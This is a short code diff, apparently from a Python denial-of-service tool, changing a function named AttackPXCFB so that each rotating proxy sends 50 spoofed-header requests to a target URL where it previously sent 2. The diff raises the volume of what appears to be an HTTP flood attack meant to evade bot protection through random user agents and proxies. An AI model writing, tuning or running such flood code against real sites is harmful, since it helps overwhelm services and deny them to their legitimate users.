@@ -539,7 +539,7 @@ def AttackPXCFB(url, until_datetime, scraper):
                     'User-Agent': random.choice(ua),
 
                 }
-                for _ in range(2):
+                for _ in range(50):
                     response = scraper.get(url,headers=headers, proxies=proxies)
                     print(response.status_code,proxy_url)
                     time.sleep(1)
